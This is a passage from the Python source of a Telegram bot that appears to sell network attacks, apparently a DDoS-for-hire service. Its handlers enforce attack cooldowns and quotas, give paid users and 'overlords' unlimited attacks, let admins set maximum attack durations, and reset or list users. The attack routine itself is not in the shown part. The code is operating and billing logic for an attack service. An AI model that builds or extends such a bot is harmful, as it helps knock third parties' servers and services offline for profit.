        bot.reply_to(message, f"⚡ **BHAI, TERE LIYE KOI COOLDOWN NAHI!** ⚡\n{branded_footer()}")
        return
    user = user_data.get(user_id, {'last_attack': None})
    now = datetime.datetime.now()
    if user['last_attack'] and (now - user['last_attack']).total_seconds() < COOLDOWN_TIME:
        remaining = int(COOLDOWN_TIME - (now - user['last_attack']).total_seconds())
        bot.reply_to(message, f"⏳ **BHAI, COOLDOWN: {remaining}s BAKI HAI!** ⏳\n{branded_footer()}")
    else:
        bot.reply_to(message, f"⚡ **BHAI, KOI COOLDOWN NAHI - AB ATTACK KAR!** ⚡\n{branded_footer()}")

@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if str(message.chat.id) not in GROUP_IDS:
        bot.reply_to(message, f"🚫 **BHAI, YE BOT SIRF OFFICIAL GROUPS ME CHALEGA!** ❌\n🔗 **Join Now:** {CHANNEL_USERNAME}\n{branded_footer()}")
        return
    if user_id in overlord_id or is_paid_user(user_id):
        bot.reply_to(message, f"⚡ **BHAI, TERE LIYE UNLIMITED ATTACKS!** ⚡\n{branded_footer()}")
    elif user_id not in user_data:
        bot.reply_to(message, f"⚡ **BHAI, TERE PASS {ATTACK_LIMIT} ATTACKS BAKI!** ⚡\n{branded_footer()}")
    else:
        user = user_data[user_id]
        total_attacks = user['attacks'] - user.get('referral_bonus', 0)
        remaining = ATTACK_LIMIT + user.get('referral_bonus', 0) - total_attacks
        bot.reply_to(message, f"⚡ **BHAI, TERE PASS {remaining} ATTACKS BAKI!** ⚡\n💎 **Unlimited Ke Liye: /start** 💎\n{branded_footer()}")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, f"❌ **BHAI, SIRF OVERLORDS USE KAR SAKTE!** ❌\n{branded_footer()}")
        return
    if str(message.chat.id) not in GROUP_IDS:
        bot.reply_to(message, f"🚫 **BHAI, YE BOT SIRF OFFICIAL GROUPS ME CHALEGA!** ❌\n🔗 **Join Now:** {CHANNEL_USERNAME}\n{branded_footer()}")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, f"⚡ **BHAI, USAGE: /setcooldown <seconds>** ⚡\n{branded_footer()}")
        return
    global COOLDOWN_TIME
    COOLDOWN_TIME = int(command[1])
    bot.reply_to(message, f"⏳ **BHAI, COOLDOWN SET KAR DIYA: {COOLDOWN_TIME}s!** ⏳\n{branded_footer()}")

@bot.message_handler(commands=['setmaxattack'])
def set_max_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, f"❌ **BHAI, SIRF OVERLORDS USE KAR SAKTE!** ❌\n{branded_footer()}")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, f"⚡ **BHAI, USAGE: /setmaxattack <limit>** ⚡\n{branded_footer()}")
        return
    global ATTACK_LIMIT
    ATTACK_LIMIT = int(command[1])
    bot.reply_to(message, f"💥 **BHAI, MAX ATTACKS SET KAR DIYA: {ATTACK_LIMIT}!** 💥\n{branded_footer()}")

@bot.message_handler(commands=['setmaxtime'])
def set_max_time(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, f"❌ **BHAI, SIRF OVERLORDS USE KAR SAKTE!** ❌\n{branded_footer()}")
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, f"⚡ **BHAI, USAGE: /setmaxtime <user> <overlord>** ⚡\n{branded_footer()}")
        return
    global USER_MAX_DURATION, USER_OVERLORD_DURATION
    USER_MAX_DURATION = int(command[1])
    USER_OVERLORD_DURATION = int(command[2])
    bot.reply_to(message, f"⏰ **BHAI, MAX TIME SET KAR DIYA!** ⏰\nUsers: {USER_MAX_DURATION}s | Overlords: {USER_OVERLORD_DURATION}s\n{branded_footer()}")

@bot.message_handler(commands=['reset'])
def reset_user(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, f"❌ **BHAI, SIRF OVERLORDS USE KAR SAKTE!** ❌\n{branded_footer()}")
        return
    if str(message.chat.id) not in GROUP_IDS:
        bot.reply_to(message, f"🚫 **BHAI, YE BOT SIRF OFFICIAL GROUPS ME CHALEGA!** ❌\n🔗 **Join Now:** {CHANNEL_USERNAME}\n{branded_footer()}")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, f"⚡ **BHAI, USAGE: /reset <user_id>** ⚡\n{branded_footer()}")
        return
    target_id = command[1]
    if target_id in user_data:
        user_data[target_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'referral_bonus': user_data[target_id].get('referral_bonus', 0),
            'mission_attacks': 0,
            'mission_invites': 0,
            'mission_reset': datetime.datetime.now()
        }
        save_users()
        bot.reply_to(message, f"✅ **BHAI, USER {target_id} RESET HO GAYA!** ✅\n{branded_footer()}")
    else:
        bot.reply_to(message, f"❌ **BHAI, USER {target_id} MILA NAHI!** ❌\n{branded_footer()}")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, f"❌ **BHAI, SIRF OVERLORDS USE KAR SAKTE!** ❌\n{branded_footer()}")
        return
    if str(message.chat.id) not in GROUP_IDS:
        bot.reply_to(message, f"🚫 **BHAI, YE BOT SIRF OFFICIAL GROUPS ME CHALEGA!** ❌\n🔗 **Join Now:** {CHANNEL_USERNAME}\n{branded_footer()}")
        return
    user_list = "\n".join([f"👤 ID: {uid}, Attacks: {data['attacks']}, Remaining: {ATTACK_LIMIT + data.get('referral_bonus', 0) - (data['attacks'] - data.get('referral_bonus', 0))}" 
                           for uid, data in user_data.items() if uid not in overlord_id])
    bot.reply_to(message, f"📜 **BHAI, USER SUMMARY** 📜\n\n{user_list}\n\n{branded_footer()}")

@bot.message_handler(commands=['shutdown'])
def shutdown_bot(message):
    user_id = str(message.from_user.id)
    if user_id not in overlord_id:
        bot.reply_to(message, f"❌ **BHAI, SIRF OVERLORDS USE KAR SAKTE!** ❌\n{branded_footer()}")
        return
    bot.reply_to(message, f"🛑 **BHAI, BOT BAND HO RAHA HAI!** 🛑\n{branded_footer()}")
    sys.exit()

# Start threads
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()
promotion_thread = threading.Thread(target=auto_promotion, daemon=True)
promotion_thread.start()

# Load data
load_users()
load_feedback_hashes()
load_referrals()
load_attack_history()
load_ranks()
load_paid_users()

# Run bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(15)